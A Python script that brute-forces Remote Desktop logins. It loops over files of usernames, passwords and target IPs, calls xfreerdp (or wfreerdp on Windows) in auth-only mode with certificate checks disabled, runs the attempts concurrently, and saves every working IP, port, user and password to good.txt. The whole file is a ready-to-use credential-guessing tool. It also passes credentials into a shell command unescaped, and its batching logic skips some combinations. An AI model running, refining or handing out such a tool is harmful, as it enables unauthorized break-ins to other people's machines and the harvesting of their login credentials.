# -*- coding: utf-8 -*-

import asyncio
import aiofiles
from platform import system as sys_ver
from asyncio import create_subprocess_shell as run
from asyncio.subprocess import DEVNULL


good = 0
completed = 0


# OS Detect
if sys_ver() == 'Windows':
    fr_name = 'wfreerdp.exe'
else:
    fr_name = 'xfreerdp'


async def connect(sem, ip, user, password):
    async with sem:
        global good, completed

        completed += 1
        print(f'Good: {good}; Completed: {completed}', end="\r")

        try:
            r_agr = f"{fr_name} /v:{ip} /port:{port} /u:'{user}' " + \
                     f"/p:'{password}' /cert-ignore +auth-only " + \
                     '+compression /sec:nla'

            a = await run(r_agr, limit=0, stdout=DEVNULL, stderr=DEVNULL)
            await asyncio.wait_for(a.communicate(), timeout=timeout)

            if a.returncode == 0:
                good += 1
                rez = f'{ip}:{port};{user}:{password}\n'
                async with aiofiles.open(f'good.txt', 'a', encoding='utf-8',
                                         errors='ignore') as f:
                    await f.write(rez)

            a.kill()
        except:
            a.kill()
        finally:
            return


async def process(ar):
    await asyncio.gather(*ar)


async def start():
    tasks = []
    sem = asyncio.Semaphore(threads)

    with open('data/users.txt', "r", encoding="utf-8") as users:
        for user in users:
            with open('data/passwords.txt', "r", encoding="utf-8") as passws:
                for passw in passws:
                    with open('data/ip.txt', "r", encoding="utf-8") as ips:
                        for ip in ips:
                            if len(tasks) != threads:
                                user = user.replace('\n', '')
                                passw = passw.replace('\n', '')
                                ip = ip.replace('\n', '')
                                task = asyncio.create_task(
                                                            connect(sem,
                                                                    ip,
                                                                    user,
                                                                    passw
                                                                    )
                                                            )
                                tasks.append(task)
                            else:
                                await process(tasks)
                                tasks = []


if __name__ == "__main__":
    threads = int(input('Threads: '))
    timeout = int(input('Timeout: '))
    port = int(input('Port: ') or 3389)

    asyncio.run(start())
